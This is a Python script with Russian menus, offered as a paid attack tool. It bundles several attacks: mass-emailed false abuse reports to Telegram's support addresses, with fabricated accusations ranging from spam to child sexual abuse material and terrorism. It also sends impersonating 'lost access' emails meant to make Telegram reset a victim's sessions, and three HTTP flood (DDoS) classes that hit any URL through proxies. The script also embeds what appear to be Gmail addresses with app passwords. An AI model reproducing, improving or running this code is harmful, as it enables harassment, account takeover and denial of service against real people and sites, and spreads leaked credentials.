#АВТОР НЕ НЕСЁТ ОТВЕСТВЕНОСТЬ ЗА ПОЛЬЗОВАТЕЛЕЙ ДАННОГО СКРИПТА 
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
import sys
from urllib.parse import urlparse
from datetime import datetime
from aiohttp import ClientSession, TCPConnector

senders = {
    'qstkennethadams388@gmail.com':'itpz jkrh mtwp escx',
    'usppaullewis171@gmail.com':'lpiy xqwi apmc xzmv',
    'ftkgeorgeanderson367@gmail.com':'okut ecjk hstl nucy',
    'nieedwardbrown533@gmail.com':'wvig utku ovjk appd',
    'h56400139@gmail.com':'byrl egno xguy ksvа',
    'den.kotelnikov220@gmail.com':'xprw tftm lldy ranp',
    'trevorzxasuniga214@gmail.com':'egnr eucw jvxg jatq',
    'dellapreston50@gmail.com':'qoit huon rzsd eewo',
    'neilfdhioley765@gmail.com':'rgco uwiy qrdc gvqh',
    'hhzcharlesbaker201@gmail.com':'mcxq vzgm quxy smhh',
    'samuelmnjassey32@gmail.com':'lgct cjiw nufr zxjg',
    'allisonikse1922@gmail.com':'tozo xrzu qndn mwuq',
    'corysnja1996@gmail.com':'pfjk ocbf augx cgiy',
    'maddietrdk1999@gmail.com':'rhqb ssiz csar cvot',
}

receivers = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
]

stats = {'sent': 0, 'failed': 0, 'lock': threading.Lock()}

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        if 'gmail.com' in sender_email:
            smtp_server, smtp_port = 'smtp.gmail.com', 587
        elif 'rambler.ru' in sender_email:
            smtp_server, smtp_port = 'smtp.rambler.ru', 587
        elif 'mail.ru' in sender_email:
            smtp_server, smtp_port = 'smtp.mail.ru', 587
        else:
            return False
        
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        
        with stats['lock']:
            stats['sent'] += 1
        return True
    except Exception:
        with stats['lock']:
            stats['failed'] += 1
        return False

def send_batch(receivers_batch, sender_email, sender_password, subject, body, delay=1):
    for rec in receivers_batch:
        send_email(rec, sender_email, sender_password, subject, body)
        time.sleep(delay)

def mass_mail(subject, body, threads=10):
    all_senders = list(senders.items())
    all_receivers = receivers
    chunk_size = max(1, len(all_receivers) // threads)
    chunks = [all_receivers[i:i+chunk_size] for i in range(0, len(all_receivers), chunk_size)]
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i, chunk in enumerate(chunks):
            sender = all_senders[i % len(all_senders)]
            futures.append(executor.submit(send_batch, chunk, sender[0], sender[1], subject, body, 0.5))
        for f in futures:
            f.result()

def snos_accounts():
    print("\n" + "="*50)
    print("СНОС АККАУНТОВ")
    print("="*50)
    print("1. СПАМ/РЕКЛАМА       2. ДОКСИНГ")
    print("3. ТРОЛЛИНГ (ОСК)     4. НАРКОТА")
    print("5. КУРАТОР НАРКОШОП   6. ПРОДАЖА ЦП")
    print("7. ВЫМОГАТЕЛЬСТВО     8. УГНЕТЕНИЕ НАЦИИ")
    print("9. УГНЕТЕНИЕ РЕЛИГИИ 10. РАСЧЛЕНЕНКА")
    print("11. ЖИВОДЕРКА        12. ПОРНУХА")
    print("13. СУТЕНЕРСТВО      14. ПРИЗЫВ К СУИЦИДУ")
    print("15. ПРИЗЫВ К ТЕРРОРУ 16. УГРОЗЫ СВАТА")
    print("17. УГРОЗЫ РАСПРАВЫ")
    print("="*50)
    comp = input("Выбор > ")
    if comp not in [str(i) for i in range(1,18)]:
        print("Неверно!")
        return
    
    username = input("USERNAME: ").strip()
    uid = input("TG ID: ").strip()
    chat_link = input("Ссылка на чат: ").strip()
    violation_link = input("Ссылка на нарушение: ").strip()
    
    texts = {
        "1": f"СПАМ. Username: {username}, ID: {uid}, Чат: {chat_link}, Нарушение: {violation_link}",
        "2": f"ДОКСИНГ. Username: {username}, ID: {uid}",
        "3": f"ТРОЛЛИНГ/ОСК. Username: {username}",
        "4": f"НАРКОТА. Username: {username}",
        "5": f"КУРАТОР НАРКОШОП. {username}",
        "6": f"ПРОДАЖА ЦП. {username}",
        "7": f"ВЫМОГАТЕЛЬСТВО ИНТИМА. {username}",
        "8": f"УГНЕТЕНИЕ НАЦИИ. {username}",
        "9": f"УГНЕТЕНИЕ РЕЛИГИИ. {username}",
        "10": f"РАСЧЛЕНЕНКА. {username}",
        "11": f"ЖИВОДЕРКА. {username}",
        "12": f"ПОРНУХА. {username}",
        "13": f"СУТЕНЕР. {username}",
        "14": f"ПРИЗЫВ К СУИЦИДУ. {username}",
        "15": f"ПРИЗЫВ К ТЕРРОРУ. {username}",
        "16": f"УГРОЗЫ СВАТА. {username}",
        "17": f"УГРОЗЫ РАСПРАВЫ. {username}",
    }
    body = f"Здравствуйте, поддержка. {texts.get(comp, 'Нарушение')}. Примите меры."
    subject = "Жалоба на аккаунт Telegram"
    
    print("\n[!] АТАКА ЗАПУЩЕНА...")
    mass_mail(subject, body, threads=10)
    print(f"\n[✓] Отправлено писем: {stats['sent']}, ошибок: {stats['failed']}")

def snos_sessions():
    print("\n" + "="*50)
    print("СНОС СЕССИЙ")
    print("="*50)
    username = input("USERNAME: ").strip()
    uid = input("TG ID: ").strip()
    phone = input("НОМЕР ТЕЛЕФОНА (с кодом страны, например +79991234567): ").strip()
    
    body = f"""Здравствуйте, уважаемая поддержка Telegram.

Я потерял доступ к своему аккаунту после перехода по фишинговой ссылке.

Мои данные:
Username: {username}
ID: {uid}
Номер телефона: {phone}

Прошу вас сбросить все активные сессии моего аккаунта и выслать код подтверждения на мой номер телефона для восстановления доступа.

Заранее спасибо."""
    
    subject = "Утеря доступа к аккаунту Telegram / сброс сессий + восстановление"
    
    print("\n[!] АТАКА ЗАПУЩЕНА...")
    mass_mail(subject, body, threads=10)
    print(f"\n[✓] Отправлено писем: {stats['sent']}, ошибок: {stats['failed']}")
    print("\n[!] После этой жалобы:")
    print("    - Все сессии будут сброшены")
    print("    - На указанный номер придет код восстановления")
    print("    - Жертва потеряет доступ ко всем устройствам")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
]

REFERERS = ["https://google.com", "https://yandex.ru", "https://bing.com"]

PROXY_LIST = [
    "45.87.80.35:8080", "192.252.221.27:4145", "50.237.207.186:80",
    "38.242.204.239:8080", "46.253.76.18:80", "188.166.43.130:80",
]

def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            proxies = [p.strip() for p in f if ':' in p and not p.startswith('#')]
            return proxies if proxies else PROXY_LIST
    except:
        return PROXY_LIST

PROXY_LIST = load_proxies()

class NormalDDoS:
    def __init__(self, target_url, threads=100, duration=60):
        self.target = target_url
        self.threads = threads
        self.duration = duration
        self.active = True
        self.hits = 0
        self.lock = threading.Lock()
        self.start = None
    
    def worker(self):
        while self.active:
            try:
                import requests
                url = f"{self.target}/?r={random.randint(1,999999)}"
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                r = requests.get(url, headers=headers, timeout=3)
                with self.lock:
                    self.hits += 1
            except:
                pass
    
    def start(self):
        import requests
        self.start = time.time()
        print(f"\n[ОБЫЧНЫЙ] Цель: {self.target} | Потоков: {self.threads} | {self.duration}с")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.active = False
        print(f"\n[ГОТОВО] Запросов: {self.hits} | RPS: {self.hits/self.duration:.0f}")

class HTTP2DDoS:
    def __init__(self, target_url, connections=200, duration=60):
        self.target = target_url
        self.conn = min(connections, 500)
        self.duration = duration
        self.active = True
        self.hits = 0
        self.lock = asyncio.Lock()
    
    async def worker(self, session):
        while self.active:
            try:
                url = f"{self.target}/?r={random.randint(1,999999)}"
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                async with session.get(url, headers=headers, ssl=False) as r:
                    await r.read()
                async with self.lock:
                    self.hits += 1
            except:
                pass
    
    async def stats(self):
        start = time.time()
        while self.active:
            await asyncio.sleep(1)
            elapsed = time.time() - start
            rate = self.hits / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r[HTTP/2] Запросов: {self.hits} | RPS: {rate:.0f}")
            sys.stdout.flush()
    
    async def run(self):
        connector = TCPConnector(limit=0, limit_per_host=0)
        async with ClientSession(connector=connector) as session:
            workers = [asyncio.create_task(self.worker(session)) for _ in range(self.conn)]
            asyncio.create_task(self.stats())
            await asyncio.sleep(self.duration)
            self.active = False
            for w in workers:
                w.cancel()
    
    def start(self):
        print(f"\n[HTTP/2] Цель: {self.target} | Соединений: {self.conn} | {self.duration}с")
        asyncio.run(self.run())
        print(f"\n[ГОТОВО] Запросов: {self.hits} | RPS: {self.hits/self.duration:.0f}")

class UltraDDoS:
    def __init__(self, target_url, connections=500, duration=60):
        self.target = target_url
        self.conn = min(connections, 1000)
        self.duration = duration
        self.active = True
        self.hits = 0
        self.lock = asyncio.Lock()
    
    async def worker(self, session):
        while self.active:
            try:
                url = f"{self.target}/?{random.randint(1,999999)}"
                async with session.get(url, ssl=False) as r:
                    pass
                async with self.lock:
                    self.hits += 1
            except:
                pass
    
    async def stats(self):
        start = time.time()
        while self.active:
            await asyncio.sleep(1)
            elapsed = time.time() - start
            rate = self.hits / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r[УЛЬТРА] Запросов: {self.hits} | RPS: {rate:.0f}")
            sys.stdout.flush()
    
    async def run(self):
        connector = TCPConnector(limit=0, limit_per_host=0)
        async with ClientSession(connector=connector) as session:
            workers = [asyncio.create_task(self.worker(session)) for _ in range(self.conn)]
            asyncio.create_task(self.stats())
            await asyncio.sleep(self.duration)
            self.active = False
            for w in workers:
                w.cancel()
    
    def start(self):
        print(f"\n[УЛЬТРА] Цель: {self.target} | Соединений: {self.conn} | {self.duration}с")
        asyncio.run(self.run())
        print(f"\n[ГОТОВО] Запросов: {self.hits} | RPS: {self.hits/self.duration:.0f}")

def ddos_menu():
    while True:
        print("\n" + "="*40)
        print("    DDOS РЕЖИМЫ")
        print("="*40)
        print(" 1. Обычный DDoS (threading)")
        print(" 2. HTTP/2 DDoS (asyncio)")
        print(" 3. Ультрабыстрый DDoS")
        print(" 4. Назад")
        print("="*40)
        sub = input("Выбор > ")
        if sub == '1':
            target = input("URL: ")
            threads = int(input("Потоки (50-500): ") or "100")
            duration = int(input("Секунд: ") or "60")
            if not target.startswith(('http://','https://')):
                target = 'https://' + target
            ddos = NormalDDoS(target, threads, duration)
            ddos.start()
        elif sub == '2':
            target = input("URL: ")
            conn = int(input("Соединений (100-500): ") or "200")
            duration = int(input("Секунд: ") or "60")
            if not target.startswith(('http://','https://')):
                target = 'https://' + target
            ddos = HTTP2DDoS(target, conn, duration)
            ddos.start()
        elif sub == '3':
            target = input("URL: ")
            conn = int(input("Соединений (200-1000): ") or "500")
            duration = int(input("Секунд: ") or "60")
            if not target.startswith(('http://','https://')):
                target = 'https://' + target
            ddos = UltraDDoS(target, conn, duration)
            ddos.start()
        elif sub == '4':
            break
        else:
            print("Неверно!")

def main():
    while True:
        print("""
╔══════════════════════════════════════╗
║Creator = @AttackaVeter ПЛАТНАЯ ВЕРСИЯ║
╠══════════════════════════════════════╣
║  1. Снос аккаунтов                    ║
║  2. Снос сессий                       ║
║  3. DDoS атака                        ║
║  4. Выход                             ║
╚══════════════════════════════════════╝
        """)
        choice = input("[root] Выбор > ")
        if choice == '1':
            snos_accounts()
            input("Нажмите Enter...")
        elif choice == '2':
            snos_sessions()
            input("Нажмите Enter...")
        elif choice == '3':
            ddos_menu()
        elif choice == '4':
            print("Выход...")
            break
        else:
            print("Неверный выбор!")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("Установи requests: pip install requests")
        sys.exit(1)
    main()